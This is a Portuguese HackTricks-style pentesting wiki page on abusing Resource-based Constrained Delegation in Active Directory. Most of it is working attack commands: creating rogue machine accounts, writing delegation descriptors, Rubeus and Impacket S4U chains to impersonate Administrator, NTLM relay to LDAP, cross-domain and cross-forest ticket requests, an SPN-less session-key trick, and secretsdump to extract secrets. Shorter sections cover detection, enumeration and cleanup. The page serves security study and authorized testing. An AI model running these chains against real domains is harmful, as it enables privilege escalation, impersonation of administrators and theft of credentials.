# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Noções básicas de Resource-based Constrained Delegation

Resource-based constrained delegation (RBCD) é semelhante a [constrained delegation](constrained-delegation.md), mas a direção da confiança é invertida. A constrained delegation tradicional registra para quais serviços um principal pode delegar; a RBCD registra no **recurso-alvo** quais principals podem impersonar usuários nele.<sup>[[12]](#references)</sup>

O atributo _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ do objeto-alvo contém um security descriptor que identifica os principals autorizados a agir em nome de outras identidades nesse recurso.

Outra diferença importante é que um principal com **permissões de escrita suficientes sobre uma conta de máquina** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty` e direitos semelhantes) pode conseguir definir _**msDS-AllowedToActOnBehalfOfOtherIdentity**_. Configurar a constrained delegation tradicional normalmente exige acesso administrativo mais privilegiado.<sup>[[1]](#references)</sup>

Mais precisamente, alterar as configurações clássicas de constrained delegation normalmente é controlado pelo `SeEnableDelegationPrivilege` em um domain controller, um direito geralmente mantido por administradores altamente privilegiados. A RBCD transfere a decisão para o security descriptor do objeto-alvo, portanto o acesso de escrita à propriedade relevante do objeto de computador pode ser suficiente sem esse direito de usuário.<sup>[[1]](#references)[[2]](#references)</sup>

### Novos conceitos

A flag **`TrustedToAuthForDelegation`** em `userAccountControl` é frequentemente descrita como um pré-requisito para **S4U2Self**, mas isso é incompleto.\
Um service principal com um SPN pode solicitar S4U2Self sem a flag. Com `TrustedToAuthForDelegation`, o service ticket retornado é **forwardable**; sem ela, o ticket normalmente é **non-forwardable**.<sup>[[5]](#references)</sup>

A constrained delegation tradicional rejeita um **TGS non-forwardable** na etapa S4U2Proxy. A RBCD pode aceitar esse ticket S4U2Self quando o security descriptor do alvo autoriza o serviço solicitante.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Estrutura do ataque

> Se você tiver **privilégios equivalentes a escrita** sobre uma **conta de computador**, poderá conseguir obter acesso privilegiado a essa máquina.

Suponha que o atacante já tenha **privilégios equivalentes a escrita sobre o objeto de computador da vítima**.

1. O atacante **compromete** uma conta com um **SPN** ou **cria uma** ("Service A"). Por padrão, um usuário de domínio autenticado pode criar até 10 objetos de computador, conforme controlado por **_MachineAccountQuota_**; um objeto de computador fornece automaticamente SPNs utilizáveis.
2. O atacante **abusa do seu privilégio WRITE** sobre o computador da vítima (ServiceB) para configurar resource-based constrained delegation e permitir que ServiceA impersonate qualquer usuário contra esse computador da vítima (ServiceB).
3. O atacante usa Rubeus para executar um **full S4U attack** (S4U2Self e S4U2Proxy) de Service A para Service B em nome de um usuário **com acesso privilegiado ao Service B**.
1. S4U2Self (a partir da conta SPN comprometida ou criada): solicitar um **TGS representando Administrator para Service A** (non-forwardable).
2. S4U2Proxy: usar esse **TGS non-forwardable** para solicitar um service ticket representando **Administrator** para o **host da vítima**.
3. O ticket non-forwardable ainda pode funcionar nesse fluxo de RBCD porque Service A está autorizado no security descriptor do recurso-alvo.
4. O atacante pode fazer **pass-the-ticket** e **impersonate** o usuário para obter **acesso ao ServiceB da vítima**.<sup>[[1]](#references)</sup>

Para verificar o _**MachineAccountQuota**_ do domínio, você pode usar:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Ataque

### Criando um Objeto de Computador

Você pode criar um objeto de computador dentro do domínio usando **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Configurando Resource-based Constrained Delegation

**Usando o módulo PowerShell do Active Directory**<sup>[[4]](#references)</sup>
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Usando powerview**<sup>[[3]](#references)</sup>
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Executando um ataque S4U completo (Windows/Rubeus)

Primeiro, criamos o novo objeto Computer com a senha `123456`, então precisamos do hash dessa senha:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Isso exibirá os hashes RC4 e AES dessa conta.\
Agora, o ataque pode ser realizado:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Você pode gerar mais tickets para mais serviços fazendo apenas uma solicitação usando o parâmetro `/altservice` do Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Os usuários podem ser marcados como **"Account is sensitive and cannot be delegated."** Se essa flag estiver habilitada, a conta não poderá ser personificada por meio deste fluxo de delegação. O BloodHound expõe essa propriedade durante a análise.

### Ferramentas Linux: RBCD de ponta a ponta com Impacket (2024+)

Se você operar a partir do Linux, poderá executar toda a cadeia de RBCD usando as ferramentas oficiais do Impacket:<sup>[[6]](#references)[[7]](#references)</sup>
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notas
- Se LDAP signing/LDAPS forçado estiver habilitado, use `impacket-rbcd -use-ldaps ...`.
- Prefira chaves AES; muitos domínios modernos restringem RC4. Impacket e Rubeus oferecem suporte a fluxos somente com AES.
- O Impacket pode reescrever o `sname` ("AnySPN") em algumas ferramentas, mas obtenha o SPN correto sempre que possível (por exemplo, CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## RBCD entre domínios e entre forests

Se o **principal delegante** que você controla estiver em um **domínio diferente** (ou até mesmo em uma **forest diferente**) do **computador de recurso**, a exploração ainda será **RBCD**, mas o fluxo do ticket não será mais o usual `S4U2Self -> S4U2Proxy` de domínio único.

### RBCD entre domínios: configurar o principal externo por SID

Ao definir `msDS-AllowedToActOnBehalfOfOtherIdentity` a partir de um **domínio diferente**, a máquina/o usuário externo pode **não ser resolvível pelo nome** no LDAP do domínio-alvo. Nesse caso, configure a entrada de delegação usando o **SID** do principal externo em vez de seu sAMAccountName/UPN.

Isso é especialmente relevante ao fazer relay de NTLM para LDAP com `ntlmrelayx.py`:<sup>[[9]](#references)</sup>
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Notas:
- `--sid` instrui o `ntlmrelayx.py` a tratar `--escalate-user` como um SID, o que é necessário quando a conta delegadora é externa ao domínio de destino.
- Mesmo que a ferramenta exiba `User not found in LDAP`, a gravação da delegação ainda pode ser bem-sucedida porque o security descriptor armazena diretamente o SID externo.

### RBCD entre domínios: sequência S4U cross-realm

Depois que o principal externo estiver em `msDS-AllowedToActOnBehalfOfOtherIdentity`, o fluxo cross-domain funcional é:<sup>[[9]](#references)[[13]](#references)</sup>

1. Obter um **TGT** para o principal delegador a partir do próprio domínio.
2. Solicitar um **referral TGT** para `krbtgt/<target-domain>`.
3. Solicitar um **cross-realm S4U2Self referral** para o usuário personificado no DC do domínio de destino.
4. Solicitar o ticket **S4U2Self** efetivo para esse usuário no domínio do delegador.
5. Executar **S4U2Proxy** no domínio do delegador para obter um referral ticket para o domínio de destino.
6. Executar o **S4U2Proxy** final no DC do domínio de destino para obter o service ticket para `cifs/host.target`, `host/host.target`, etc.

É por isso que as ferramentas Linux padrão frequentemente falham em RBCD cross-domain:<sup>[[9]](#references)</sup>
- o **realm** da solicitação pode precisar ser diferente do realm do TGT usado no `TGS-REQ`
- a cadeia precisa de **etapas S4U2Proxy independentes**, e não apenas de `S4U2Self` ou de `S4U2Self` seguido imediatamente por um único `S4U2Proxy`

### RBCD cross-domain a partir do Linux

A Synacktiv publicou uma implementação do Impacket `getST.py` que reproduz a sequência cross-realm no Linux ao lidar explicitamente com os dois KDCs:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
Operacionalmente, os novos argumentos são:
- `-dc-ip`: DC do domínio **delegante**
- `-targetdomain`: domínio do computador de **recurso**
- `-targetdc`: DC do domínio de **recurso**

### Limitações do RBCD entre forests

O RBCD entre forests tem uma limitação importante: **o usuário impersonado deve pertencer à mesma forest que o principal delegante**. Em outras palavras, se sua conta de máquina controlada está em `valhalla.local` e o recurso alvo está em `asgard.local`, geralmente você **não pode impersonar usuários arbitrários de `asgard.local`** nesse recurso via RBCD.<sup>[[9]](#references)</sup>

Ele ainda é explorável quando:
- o usuário da **forest delegante** é um **administrador local** (ou possui outros privilégios) no host do recurso na outra forest
- uma trust permite o caminho de autenticação necessário e o SID estrangeiro é aceito no security descriptor do computador alvo

### Particularidades do protocolo RBCD entre forests

O RBCD entre forests não é apenas "entre domínios com uma trust". O fluxo observado inclui duas particularidades que ferramentas comuns historicamente não tratam:<sup>[[9]](#references)</sup>

1. Uma solicitação **S4U2Proxy** extra que define **`PA-PAC-OPTIONS=branch-aware`**
2. Um service ticket final que pode ser retornado usando **RC4**, mesmo quando outros etypes foram solicitados

O fluxo prático é:

1. Obter um TGT para o principal delegante na forest A.
2. Solicitar **S4U2Self** para o usuário impersonado na forest A.
3. Solicitar **S4U2Proxy** na forest A para obter um referral TGT para a forest B.
4. Enviar um segundo **S4U2Proxy** na forest A **sem o ticket S4U2Self como additional ticket**, mas com `branch-aware` habilitado, para obter outro referral TGT para a forest B.
5. Opcionalmente, solicitar um service ticket normal na forest B para o principal delegante (esse ticket não é necessário para o abuso final).
6. Usar os referral tickets das etapas 3 e 4 para solicitar o ticket **S4U2Proxy** final na forest B para o usuário da forest A impersonado, destinado ao SPN alvo.

### RBCD entre forests a partir do Linux

A mesma branch do Synacktiv Impacket adiciona um switch `-forest` para essa lógica:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### RBCD recursivo em vários domínios (3+ domínios)

Em **florestas com vários domínios**, tanto **S4U2Self** quanto **S4U2Proxy** podem ser **recursivos**, em vez de pararem após uma única referral:

- **S4U2Self recursivo**: o primeiro `S4U2Self` é enviado ao **domínio do usuário impersonado**, os saltos intermediários entre domínios pai/filho são percorridos com referrals normais de `TGS-REQ` para `krbtgt/<REALM>`, e o **`S4U2Self` final** é enviado no **próprio domínio do principal delegante**.
- Isso significa que **ter apenas um TGT** de uma conta de máquina pode ser suficiente para impersonar um **administrador de outro domínio na mesma forest** e solicitar `cifs/host`, `host/host`, `wsman/host`, etc.
- **S4U2Proxy recursivo** segue a cadeia de trust da mesma forma: os saltos intermediários reutilizam o ticket anterior como TGT ao solicitar a referral do próximo `krbtgt/<REALM>`, e somente o último salto retorna o service ticket final.<sup>[[10]](#references)</sup>

Um exemplo prático na mesma forest é:
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### SPN-less RBCD entre domínios / entre forests

Se o **delegating principal for um usuário sem um SPN**, o último `S4U2Self` recursivo falhará com **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. A solução alternativa é **tentar novamente apenas o salto final como `S4U2Self+U2U`**.<sup>[[10]](#references)</sup>

Versão resumida da cadeia de abuso:

1. Autentique-se com o **NT hash** para fazer com que o KDC priorize **RC4-HMAC (etype 23)**.
2. Solicite **`-self -u2u`** primeiro e mantenha esse ticket separado da etapa posterior de proxy.
3. Extraia a chave de sessão do **TGT** com `describeTicket.py`.
4. Substitua o **NT hash** do usuário por essa **session key** usando `changepasswd.py -newhashes <session_key>`.
5. Reutilize o ticket **`S4U2Self+U2U`** como **`-additional-ticket`** durante uma solicitação **`-proxy`** separada.
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
Observações operacionais:

- Quando o **primeiro salto confiável já é outra forest**, prefira o algoritmo **branch-aware** (`getST.py ... -forest`) para corresponder ao comportamento nativo do Windows. Se a forest estrangeira só for alcançada **mais tarde** na cadeia, o fluxo recursivo sem reconhecimento de branches ainda poderá funcionar.<sup>[[9]](#references)</sup>
- Em DCs recentes do **Windows Server 2022/2025**, forçar RC4 pode falhar com **`KDC_ERR_ETYPE_NOSUPP`** devido à descontinuação do RC4; isso pode tornar o **RBCD sem SPN** impossível, embora o RBCD clássico baseado em SPN ainda funcione com AES.<sup>[[15]](#references)</sup>
- Execute **`S4U2Self+U2U` antes de alterar o hash/senha do usuário**: `SamrChangePasswordUser` **não** recalcula as chaves AES Kerberos da conta, portanto, alterar a senha primeiro pode interromper solicitações de tickets posteriores.<sup>[[14]](#references)</sup>
- A conta personificada ainda precisa ser **delegável**: **Protected Users** e contas com **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** bloqueiam a cadeia.

## Notas de detecção / hardening

- Os caminhos de RBCD entre domínios/forests ainda são normalmente criados por meio de **abuso de ACL** ou **relay-to-LDAP**. Imponha **LDAP signing** e **LDAP channel binding** nos DCs para interromper os caminhos comuns de configuração.
- Audite quem pode gravar `msDS-AllowedToActOnBehalfOfOtherIdentity` em objetos de computador e resolva os SIDs armazenados, incluindo **foreign security principals**.
- Em ambientes com muitos trusts, revise **Selective Authentication**, **SID filtering** e se usuários de uma forest estrangeira possuem direitos de **local admin** nos hosts de recursos.

### Acessando

A última linha de comando executará o **ataque S4U completo e injetará o TGS** do Administrator no host vítima **em memória**.\
Neste exemplo, foi solicitado um TGS para o serviço **CIFS** do Administrator, portanto você poderá acessar **C$**:
```bash
ls \\victim.domain.local\C$
```
### Abusar de diferentes service tickets

Saiba mais sobre os [**service tickets disponíveis aqui**](silver-ticket.md#available-services).

## Enumeração, auditoria e limpeza

### Enumerar computadores com RBCD configurado

PowerShell (decodificando o SD para resolver SIDs):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (ler ou limpar com um comando):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Limpeza / reset RBCD

- PowerShell (limpar o atributo):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Erros do Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Isso significa que o Kerberos está configurado para não usar DES ou RC4, e você está fornecendo apenas o hash RC4. Forneça ao Rubeus pelo menos o hash AES256 (ou forneça os hashes rc4, aes128 e aes256). Exemplo: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** durante `-self` para um usuário normal: o principal delegante provavelmente **não tem SPN**. Tente novamente o **último salto** como **`S4U2Self+U2U`**, em vez de um `S4U2Self` normal.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** durante **RBCD sem SPN**: DCs recentes podem rejeitar o caminho **RC4-HMAC** forçado exigido pelo truque de **`S4U2Self+U2U` + substituição da chave de sessão**. Tente um caminho clássico de **RBCD com SPN** usando AES.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Isso significa que o horário do computador atual é diferente do horário do DC e que o Kerberos não está funcionando corretamente.
- **`preauth_failed`**: Isso significa que o nome de usuário + hashes fornecidos não estão funcionando para fazer login. Talvez você tenha esquecido de colocar o "$" dentro do nome de usuário ao gerar os hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Isso pode significar:
- O usuário que você está tentando impersonar não pode acessar o serviço desejado (porque você não pode impersoná-lo ou porque ele não tem privilégios suficientes)
- O serviço solicitado não existe (se você solicitar um ticket para winrm, mas o winrm não estiver em execução)
- O fakecomputer criado perdeu seus privilégios sobre o servidor vulnerável, e você precisa concedê-los novamente.
- Você está abusando do KCD clássico; lembre-se de que o RBCD funciona com tickets S4U2Self não encaminháveis, enquanto o KCD exige tickets encaminháveis.

## Observações, relays e alternativas

- Você também pode gravar o RBCD SD por meio do AD Web Services (ADWS) se o LDAP estiver filtrado. Consulte:


{{#ref}}
adws-enumeration.md
{{#endref}}

- As cadeias de relay do Kerberos frequentemente terminam em RBCD para obter SYSTEM local em uma única etapa. Consulte exemplos práticos de ponta a ponta:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Se a assinatura LDAP/vinculação de canal estiverem **desabilitadas** e você puder criar uma conta de máquina, ferramentas como o **KrbRelayUp** poderão encaminhar uma autenticação Kerberos forçada para o LDAP, definir `msDS-AllowedToActOnBehalfOfOtherIdentity` para a conta de máquina no objeto de computador de destino e impersonar imediatamente **Administrator** via S4U a partir de outro host.<sup>[[8]](#references)</sup>

## References

- [1] [Abanando o cão: abusando da Resource-Based Constrained Delegation para atacar o Active Directory](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Mais uma palavra sobre Delegation – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Resource-based Constrained Delegation do Kerberos: tomada de controle de objetos de computador](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – Abuso de Resource-Based Constrained Delegation](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity matou o domínio: uma visão geral ofensiva do Kerberos](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (oficial)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Cheatsheet rápido de Linux com sintaxe recente](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (assinatura LDAP desativada → relay do Kerberos para RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Explorando RBCD entre domínios e entre forests](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Explorando RBCD entre domínios e entre forests: parte 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Branch do Impacket da Synacktiv - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - visão geral da Kerberos constrained delegation](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - S4U2Self entre domínios](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - detectar e corrigir o uso de RC4 no Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – detalhes do S4U2Proxy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
{{#include ../../banners/hacktricks-training.md}}
